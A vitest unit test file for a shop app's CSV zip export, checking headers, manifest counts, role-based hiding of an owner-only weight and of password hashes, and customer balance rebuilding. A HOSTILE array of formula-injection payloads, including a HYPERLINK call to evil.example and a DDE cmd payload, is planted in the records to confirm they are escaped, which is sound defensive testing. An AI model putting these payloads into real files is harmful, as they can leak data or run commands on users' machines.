import { spawnSync } from 'node:child_process';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { afterAll, describe, expect, it } from 'vitest';
import type { SyncResource } from '@/lib/api/types';
import {
  DOWNLOAD_FILES,
  DownloadBooksNotLoaded,
  buildDownload,
  type DownloadFile,
} from '@/lib/downloadEverything';
import { parseCsv } from './support/csv';
import { allocationRow, billRow, customerRow, itemRow, receiptRow } from './support/money-rows';
import {
  categoryRow,
  designRow,
  rateRow,
  settingRow,
  skuPrivateRow,
  skuRow,
  subcategoryRow,
  userRow,
  uuid,
} from './support/rows';
import { readZipText } from './support/zip';

// T-E04 ("Download everything produces the zip, with a cell that starts with = written as text"), T-R05 (the zip holds the files of B3 and a MANIFEST.csv whose counts equal the books; the
// owner-only weight is in it only for the owner; cells that start with =, +, -, @, a tab or a carriage return are quoted; each customer's balance can be rebuilt from the zip alone) and the
// T-D03 clause (no CSV export for a biller holds the original weight), as the unit half (spec B3, C15, D9, D12; task WEB12b). The database half is
// tests/e2e/hidden-and-download.spec.ts: the same zip from a real browser, its counts against the database's, the record route, and the Mac tool of the API (scripts/zip-balances.mjs).

const dirs: string[] = [];
afterAll(() => {
  for (const d of dirs) rmSync(d, { recursive: true, force: true });
});

const HOSTILE = [
  '=HYPERLINK("http://evil.example/?"&A1,"click")',
  '+1+1',
  '-2+3',
  '@SUM(A1)',
  "=cmd|' /C calc'!A0",
  '\tcmd',
  '\rcmd',
];
const OWNER_WEIGHT = '7.123'; // a value no other column holds

// ---------------------------------------------------------------------------------------------- one small book, worked by hand
//
//   Meera   bill 1  10,000.00 (round-off -0.40) | bill 2  3,000.00 CANCELLED | opening bill 5,000.00
//           receipt 1 cash 4,000.00 -> live allocation 4,000.00 on bill 1 | receipt 2 UPI 1,500.00, its allocation RELEASED | receipt 3 700.00 VOIDED, its allocation does not count
//           billed 10,000 + 5,000 = 15,000.00   received 4,000 + 1,500 = 5,500.00   allocated 4,000.00 (only the live one)
//           outstanding 15,000 - 4,000 = 11,000.00   advance 5,500 - 4,000 - 0 = 1,500.00   fine 0
//   Dev     bill 3  20,000.00 with 12.500 g of silver due
//           receipt 4 money 25,000.00 (live allocation 20,000.00) | receipt 5 refund 200.00 | receipt 6 silver 10.000 g (live allocation 10.000 g)
//           billed 20,000.00   received 25,000.00   refunded 200.00   allocated 20,000.00
//           outstanding 0.00   advance 25,000 - 20,000 - 200 = 4,800.00   fine_outstanding 12.500 - 10.000 = 2.500   fine_advance 0.000
//   Walk-in nothing: 0.00 and 0.000

const ids = { meera: uuid(5101), dev: uuid(5102), walkin: uuid(5103) };
const EXPECTED_BALANCES: Record<
  string,
  { outstanding: string; advance: string; fine_outstanding: string; fine_advance: string }
> = {
  [ids.meera]: {
    outstanding: '11000.00',
    advance: '1500.00',
    fine_outstanding: '0.000',
    fine_advance: '0.000',
  },
  [ids.dev]: {
    outstanding: '0.00',
    advance: '4800.00',
    fine_outstanding: '2.500',
    fine_advance: '0.000',
  },
  [ids.walkin]: {
    outstanding: '0.00',
    advance: '0.00',
    fine_outstanding: '0.000',
    fine_advance: '0.000',
  },
};

function book(): Partial<Record<SyncResource, object[]>> {
  const meera = customerRow(ids.meera, {
    name: 'Meera Shah',
    mobile: '+919876543210',
    notes: HOSTILE[0],
  });
  const dev = customerRow(ids.dev, {
    name: 'Dev',
    mobile: '9876500000',
    notes: HOSTILE[1],
    address: HOSTILE[5],
  });
  const walkin = customerRow(ids.walkin, {
    name: 'Walk-in',
    mobile: null,
    is_walkin: true,
    email: null,
    address: null,
  });
  const b1 = billRow(1, ids.meera, {
    subtotal: '10000.40',
    round_off: '-0.40',
    grand_total: '10000.00',
    notes: HOSTILE[2],
  });
  const b2 = billRow(2, ids.meera, {
    status: 'cancelled',
    cancel_reason: HOSTILE[3],
    cancelled_at: '2026-10-16T09:00:00.000000Z',
    cancelled_on: '2026-10-16',
    grand_total: '3000.00',
  });
  const ob = billRow(3, ids.meera, {
    bill_no: 'OB-0001',
    doc_type: 'opening_balance',
    grand_total: '5000.00',
  });
  const b3 = billRow(4, ids.dev, { grand_total: '20000.00', fine_weight_due: '12.500' });
  const r1 = receiptRow(1, ids.meera, { amount: '4000.00', reference: HOSTILE[4] });
  const r2 = receiptRow(2, ids.meera, { mode: 'UPI', amount: '1500.00' });
  const r3 = receiptRow(3, ids.meera, {
    amount: '700.00',
    status: 'voided',
    void_reason: HOSTILE[6],
  });
  const r4 = receiptRow(4, ids.dev, { amount: '25000.00' });
  const r5 = receiptRow(5, ids.dev, { kind: 'refund', amount: '200.00' });
  const r6 = receiptRow(6, ids.dev, {
    kind: 'fine_silver',
    mode: null,
    amount: '0.00',
    fine_grams: '10.000',
  });
  return {
    users: [
      // the API never sends these two fields; a hash in a row must still not reach the file
      { ...userRow(1), email: 'owner@example.test', password_hash: 'SECRET-HASH-VALUE' } as object,
      userRow(2, { role: 'biller', full_name: 'Ravi' }),
    ],
    settings: [
      settingRow('business', { name: 'Jaishri', city: 'Jaipur' }),
      settingRow('data_epoch', 3),
      settingRow('last_download', {
        at: '2026-09-20T09:00:00.000000Z',
        by: uuid(901),
        counts: { customers: 3 },
      }),
    ],
    'daily-rates': [
      rateRow(1),
      rateRow(2, { material: 'Silver', purity: '925', rate_per_gram: '88.50' }),
    ],
    categories: [
      categoryRow(1, 'Ring', 'RING'),
      categoryRow(2, 'Necklace', 'NECK', { active: false }),
    ],
    subcategories: [subcategoryRow(1, 1, 'Plain')],
    designs: [designRow(1, { tags: ['bridal', 'new'], notes: HOSTILE[3] })],
    skus: [skuRow(1, 1), skuRow(2, 1, { status: 'Sold', sold_bill_id: b1.id })],
    'sku-private': [skuPrivateRow(1, OWNER_WEIGHT), skuPrivateRow(2, '8.001')],
    customers: [meera, dev, walkin],
    bills: [b1, b2, ob, b3],
    'bill-items': [
      itemRow(b1, 1, { item_total: '10000.00' }),
      itemRow(b1, 2),
      itemRow(b3, 1, { item_total: '20000.00' }),
    ],
    receipts: [r1, r2, r3, r4, r5, r6],
    'receipt-allocations': [
      allocationRow(1, r1, b1, { amount: '4000.00' }),
      allocationRow(2, r2, b1, { amount: '1500.00', released_at: '2026-10-16T09:00:00.000000Z' }),
      allocationRow(3, r3, b1, { amount: '700.00' }),
      allocationRow(4, r4, b3, { amount: '20000.00' }),
      allocationRow(5, r6, b3, { fine_grams: '10.000' }),
    ],
  };
}

const build = (role: 'owner' | 'biller' | 'staff' = 'owner', cache = book()) =>
  buildDownload({
    role,
    rows: (resource) => cache[resource] ?? [],
    date: '2026-10-19',
    modified: new Date(2026, 9, 19, 10, 30, 0),
  });

const files = (zip: Uint8Array) => readZipText(zip);
const csv = (zip: Uint8Array, name: string) => {
  const text = files(zip).get(name);
  if (text === undefined) throw new Error(`${name} is not in the zip`);
  return parseCsv(text);
};

// the column names of the database (READ_COLUMNS of the API, src/permissions/matrix.ts): the contract with scripts/zip-balances.mjs
const STAMPS = ['created_at', 'updated_at', 'created_by', 'updated_by'];
const HEADERS: Record<DownloadFile, string[]> = {
  customers: [
    'id',
    'name',
    'mobile',
    'customer_type',
    'email',
    'address',
    'gst_number',
    'pan',
    'notes',
    'is_walkin',
    'archived_at',
    ...STAMPS,
  ],
  bills: [
    'id',
    'bill_no',
    'customer_id',
    'bill_date',
    'doc_type',
    'sale_type',
    'status',
    'cancel_reason',
    'cancelled_at',
    'cancelled_on',
    'cancelled_by',
    'reissue_of',
    'pricing_version',
    'subtotal',
    'discount',
    'additional_charges',
    'gst_percent',
    'gst_amount',
    'grand_total',
    'round_off',
    'fine_weight_due',
    'notes',
    'cash_override_reason',
    ...STAMPS,
  ],
  bill_items: [
    'id',
    'bill_id',
    'line_no',
    'sku_id',
    'design_no',
    'sku_no',
    'category',
    'material',
    'purity',
    'selling_method',
    'gross_weight',
    'customer_net_weight',
    'quantity',
    'metal_rate',
    'labour_rate',
    'labour_amount',
    'piroi',
    'other_charges',
    'metal_amount',
    'fine_weight_due',
    'item_total',
    'tax_rate',
    'tax_amount',
    'list_metal_rate',
    'list_labour_rate',
    'created_at',
    'updated_at',
  ],
  receipts: [
    'id',
    'customer_id',
    'kind',
    'mode',
    'amount',
    'fine_grams',
    'silver_rate',
    'paid_on',
    'reference',
    'notes',
    'is_opening',
    'cash_override_reason',
    'status',
    'void_reason',
    'voided_at',
    'voided_on',
    'voided_by',
    ...STAMPS,
  ],
  receipt_allocations: [
    'id',
    'receipt_id',
    'bill_id',
    'customer_id',
    'amount',
    'fine_grams',
    'released_at',
    'created_at',
    'updated_at',
  ],
  designs: [
    'id',
    'design_no',
    'name',
    'category_id',
    'subcategory_id',
    'material',
    'purity',
    'selling_method',
    'description',
    'notes',
    'tags',
    'primary_photo_id',
    'photo_ids',
    'archived_at',
    ...STAMPS,
  ],
  skus: [
    'id',
    'design_id',
    'sku_no',
    'barcode',
    'gross_weight',
    'customer_net_weight',
    'stones',
    'stone_weight',
    'kundan',
    'kundan_weight',
    'piroi',
    'labour_retail',
    'labour_semi',
    'labour_wholesale',
    'status',
    'location',
    'notes',
    'sold_bill_id',
    'archived_at',
    ...STAMPS,
  ],
  daily_rates: [
    'id',
    'material',
    'purity',
    'rate_per_gram',
    'rate_date',
    'confirmed_by',
    ...STAMPS,
  ],
  categories: ['id', 'name', 'prefix', 'active', ...STAMPS],
  subcategories: ['id', 'category_id', 'name', 'active', ...STAMPS],
  settings: ['setting_key', 'value', ...STAMPS],
  users: ['id', 'full_name', 'role', 'active', 'updated_at'],
};

describe('T-R05 the zip holds the files of B3, named by table, and a MANIFEST.csv', () => {
  it('has the twelve files of API35 and MANIFEST.csv, in that order, nothing else', () => {
    const built = build();
    expect([...files(built.zip).keys()]).toEqual([
      ...DOWNLOAD_FILES.map((f) => `${f}.csv`),
      'MANIFEST.csv',
    ]);
    // the names the Mac tool looks for (scripts/zip-balances.mjs)
    for (const name of [
      'customers.csv',
      'bills.csv',
      'receipts.csv',
      'receipt_allocations.csv',
      'MANIFEST.csv',
    ])
      expect(files(built.zip).has(name)).toBe(true);
    expect(built.filename).toBe('download-everything-2026-10-19.zip');
  });

  it.each(DOWNLOAD_FILES)(
    '%s.csv has the database column names in its header, in the order of the API',
    (file) => {
      const expected = file === 'skus' ? [...HEADERS.skus, 'original_net_weight'] : HEADERS[file];
      expect(csv(build().zip, `${file}.csv`).header).toEqual(expected);
    }
  );

  it('MANIFEST.csv has the columns file, rows and date, and the count of each file equals the rows of the file and the rows of the books', () => {
    const built = build();
    const manifest = csv(built.zip, 'MANIFEST.csv');
    expect(manifest.header).toEqual(['file', 'rows', 'date']);
    expect(manifest.rows.map((r) => r[0])).toEqual(DOWNLOAD_FILES.map((f) => `${f}.csv`));
    for (const [name, rows, date] of manifest.rows) {
      expect(Number(rows), name).toBe(csv(built.zip, name).rows.length);
      expect(date).toBe('2026-10-19');
    }
    const cache = book();
    const resourceOf: Record<DownloadFile, SyncResource> = {
      customers: 'customers',
      bills: 'bills',
      bill_items: 'bill-items',
      receipts: 'receipts',
      receipt_allocations: 'receipt-allocations',
      designs: 'designs',
      skus: 'skus',
      daily_rates: 'daily-rates',
      categories: 'categories',
      subcategories: 'subcategories',
      settings: 'settings',
      users: 'users',
    };
    for (const file of DOWNLOAD_FILES) {
      expect(built.counts[file], file).toBe(cache[resourceOf[file]]?.length);
    }
    expect(Object.keys(built.counts).sort()).toEqual([...DOWNLOAD_FILES].sort());
  });

  it('is accepted by the system unzip (unzip -t)', () => {
    const probe = spawnSync('unzip', ['-v'], { encoding: 'utf8' });
    if (probe.error) return; // no unzip on this computer: the tests' own reader and the Mac tool of the e2e test read it
    const dir = mkdtempSync(path.join(tmpdir(), 'jv-download-'));
    dirs.push(dir);
    const file = path.join(dir, 'x.zip');
    writeFileSync(file, build().zip);
    const test = spawnSync('unzip', ['-t', file], { encoding: 'utf8' });
    expect(test.stdout).toContain('No errors detected');
  });

  it('an empty file still has its header, and a book that has not been loaded is refused rather than zipped empty', () => {
    const cache = book();
    cache['subcategories'] = [];
    expect(csv(build('owner', cache).zip, 'subcategories.csv')).toEqual({
      header: HEADERS.subcategories,
      rows: [],
    });
    expect(build('owner', cache).counts.subcategories).toBe(0);
    // nothing in memory at all: no users, no settings (the hydrate has not finished, or the session ended)
    expect(() => build('owner', {})).toThrow(DownloadBooksNotLoaded);
    expect(() => build('owner', { customers: [] })).toThrow(/not loaded/i);
  });
});

describe('T-E04 / T-R05 a cell that starts with =, +, -, @, a tab or a carriage return is written as text', () => {
  it('the hostile cells of the books come back from the files with a single quote in front', () => {
    const built = build();
    const customers = csv(built.zip, 'customers.csv');
    const col = (name: string) => customers.header.indexOf(name);
    const meera = customers.rows.find((r) => r[col('id')] === ids.meera)!;
    const dev = customers.rows.find((r) => r[col('id')] === ids.dev)!;
    expect(meera[col('notes')]).toBe(`'${HOSTILE[0]}`);
    expect(dev[col('notes')]).toBe(`'${HOSTILE[1]}`);
    expect(dev[col('address')]).toBe(`'${HOSTILE[5]}`);
    // a mobile number typed with its +91 is text that starts with +: quoted like the rest
    expect(meera[col('mobile')]).toBe("'+919876543210");

    const bills = csv(built.zip, 'bills.csv');
    expect(
      bills.rows.find((r) => r[bills.header.indexOf('notes')] !== '')![
        bills.header.indexOf('notes')
      ]
    ).toBe(`'${HOSTILE[2]}`);
    const cancelled = bills.rows.find((r) => r[bills.header.indexOf('status')] === 'cancelled')!;
    expect(cancelled[bills.header.indexOf('cancel_reason')]).toBe(`'${HOSTILE[3]}`);

    const receipts = csv(built.zip, 'receipts.csv');
    expect(receipts.rows.map((r) => r[receipts.header.indexOf('reference')])).toContain(
      `'${HOSTILE[4]}`
    );
    expect(receipts.rows.map((r) => r[receipts.header.indexOf('void_reason')])).toContain(
      `'${HOSTILE[6]}`
    );

    const designs = csv(built.zip, 'designs.csv');
    expect(designs.rows[0][designs.header.indexOf('notes')]).toBe(`'${HOSTILE[3]}`);
  });

  it('no text cell of any file starts with one of the six characters: the file as a spreadsheet will read it has no formula', () => {
    const built = build();
    for (const [name, text] of files(built.zip)) {
      const { rows } = parseCsv(text);
      for (const [i, row] of rows.entries())
        for (const [j, cell] of row.entries()) {
          const header = parseCsv(text).header[j];
          // a signed number in a number column (the round-off -0.40) is a number, not a formula: it is the only kind of cell allowed to start with a minus
          if (/^-\d+(\.\d+)?$/.test(cell)) continue;
          expect(cell, `${name} row ${i + 2} ${header}`).not.toMatch(/^[=+\-@\t\r]/);
        }
    }
  });

  it('numbers are not touched: a negative round-off stays -0.40, money and weight stay as the books have them, flags are 1 and 0, an empty value is an empty cell', () => {
    const built = build();
    const bills = csv(built.zip, 'bills.csv');
    const roundOff = bills.header.indexOf('round_off');
    expect(bills.rows.map((r) => r[roundOff])).toContain('-0.40');
    expect(bills.rows.map((r) => r[bills.header.indexOf('grand_total')]).sort()).toEqual([
      '10000.00',
      '20000.00',
      '3000.00',
      '5000.00',
    ]);
    const customers = csv(built.zip, 'customers.csv');
    const flag = customers.header.indexOf('is_walkin');
    expect(customers.rows.map((r) => r[flag])).toEqual(['0', '0', '1']);
    expect(
      customers.rows.find((r) => r[customers.header.indexOf('name')] === 'Walk-in')![
        customers.header.indexOf('mobile')
      ]
    ).toBe('');
    const categories = csv(built.zip, 'categories.csv');
    expect(categories.rows.map((r) => r[categories.header.indexOf('active')])).toEqual(['1', '0']);
  });

  it('a JSON column is written as JSON text, and the settings value too', () => {
    const built = build();
    const designs = csv(built.zip, 'designs.csv');
    expect(JSON.parse(designs.rows[0][designs.header.indexOf('tags')])).toEqual(['bridal', 'new']);
    const settings = csv(built.zip, 'settings.csv');
    const value = (key: string) =>
      settings.rows.find((r) => r[0] === key)![settings.header.indexOf('value')];
    expect(JSON.parse(value('business'))).toEqual({ name: 'Jaishri', city: 'Jaipur' });
    expect(JSON.parse(value('data_epoch'))).toBe(3);
  });
});

describe('T-R05 / T-D03 the owner-only weight is in the zip only for the owner', () => {
  it('the owner gets original_net_weight in skus.csv, piece by piece', () => {
    const skus = csv(build('owner').zip, 'skus.csv');
    const weight = skus.header.indexOf('original_net_weight');
    expect(weight).toBe(skus.header.length - 1);
    const bySku = new Map(skus.rows.map((r) => [r[0], r[weight]]));
    expect(bySku.get(uuid(1001))).toBe(OWNER_WEIGHT);
    expect(bySku.get(uuid(1002))).toBe('8.001');
  });

  it.each(['biller', 'staff'] as const)(
    'for a %s no file has the column and no file holds the weight, even when the books handed in hold it',
    (role) => {
      // `rows` returns sku-private rows here, as a careless caller could: the builder must not use them
      const built = build(role);
      for (const [name, text] of files(built.zip)) {
        expect(text, name).not.toContain('original_net_weight');
        expect(text, name).not.toContain(OWNER_WEIGHT);
        expect(text, name).not.toContain('8.001');
      }
      expect(csv(built.zip, 'skus.csv').header).toEqual(HEADERS.skus);
    }
  );
});

describe('T-R05 the people: names and roles, never a hash', () => {
  it('users.csv holds the id, the name, the role, the flag and the stamp, and nothing the row happened to carry besides', () => {
    const built = build();
    const users = csv(built.zip, 'users.csv');
    expect(users.header).toEqual(['id', 'full_name', 'role', 'active', 'updated_at']);
    expect(users.rows.map((r) => r[2])).toEqual(['owner', 'biller']);
    for (const [name, text] of files(built.zip)) {
      expect(text, name).not.toContain('SECRET-HASH-VALUE');
      expect(text, name).not.toContain('password');
      expect(text, name).not.toContain('owner@example.test');
    }
  });
});

describe("T-R05 (the drill) each customer's balance is rebuilt from the zip alone and agrees with the books worked by hand", () => {
  // The rules of V2 (db/queries/V2_customer_balances.sql) in whole paise and milligrams, read from the CSV files by the NAMES in their header, as the Mac tool does. The real tool is run on a
  // real zip in the e2e test; this is the same drill on the hand-worked book above.
  const ZERO = BigInt(0); // (BigInt literals need a newer target than this project's tsconfig)
  const units = (text: string, scale: number) => {
    const m = /^(-?)(\d+)(?:\.(\d+))?$/.exec(text.trim());
    if (!m) throw new Error(`${JSON.stringify(text)} is not a number`);
    const n = BigInt(m[2] + (m[3] ?? '').padEnd(scale, '0').slice(0, scale));
    return m[1] === '-' ? -n : n;
  };
  const show = (n: bigint, scale: number) => {
    const neg = n < ZERO;
    const s = (neg ? -n : n).toString().padStart(scale + 1, '0');
    return `${neg ? '-' : ''}${s.slice(0, -scale)}.${s.slice(-scale)}`;
  };

  it('outstanding, advance, fine_outstanding and fine_advance of every customer come out of customers, bills, receipts and receipt_allocations', () => {
    const built = build();
    const customers = csv(built.zip, 'customers.csv');
    const bills = csv(built.zip, 'bills.csv');
    const receipts = csv(built.zip, 'receipts.csv');
    const allocations = csv(built.zip, 'receipt_allocations.csv');
    const at = (t: { header: string[] }, name: string) => {
      const i = t.header.indexOf(name);
      if (i < 0) throw new Error(`no column ${name}`);
      return i;
    };
    const acc = new Map<string, Record<string, bigint>>();
    for (const r of customers.rows)
      acc.set(r[at(customers, 'id')], {
        billed: ZERO,
        received: ZERO,
        refunded: ZERO,
        allocated: ZERO,
        fineBilled: ZERO,
        fineReceived: ZERO,
        fineAllocated: ZERO,
      });
    for (const r of bills.rows) {
      if (r[at(bills, 'status')] !== 'active') continue;
      const a = acc.get(r[at(bills, 'customer_id')])!;
      a.billed += units(r[at(bills, 'grand_total')], 2);
      a.fineBilled += units(r[at(bills, 'fine_weight_due')], 3);
    }
    const live = new Set<string>();
    for (const r of receipts.rows) {
      if (r[at(receipts, 'status')] !== 'active') continue;
      live.add(r[at(receipts, 'id')]);
      const a = acc.get(r[at(receipts, 'customer_id')])!;
      const kind = r[at(receipts, 'kind')];
      if (kind === 'money') a.received += units(r[at(receipts, 'amount')], 2);
      else if (kind === 'refund') a.refunded += units(r[at(receipts, 'amount')], 2);
      else a.fineReceived += units(r[at(receipts, 'fine_grams')], 3);
    }
    for (const r of allocations.rows) {
      if (r[at(allocations, 'released_at')] !== '' || !live.has(r[at(allocations, 'receipt_id')]))
        continue;
      const a = acc.get(r[at(allocations, 'customer_id')])!;
      a.allocated += units(r[at(allocations, 'amount')], 2);
      a.fineAllocated += units(r[at(allocations, 'fine_grams')], 3);
    }
    const got = Object.fromEntries(
      [...acc].map(([id, a]) => [
        id,
        {
          outstanding: show(a.billed - a.allocated, 2),
          advance: show(a.received - a.allocated - a.refunded, 2),
          fine_outstanding: show(a.fineBilled - a.fineAllocated, 3),
          fine_advance: show(a.fineReceived - a.fineAllocated, 3),
        },
      ])
    );
    expect(got).toEqual(EXPECTED_BALANCES);
  });
});
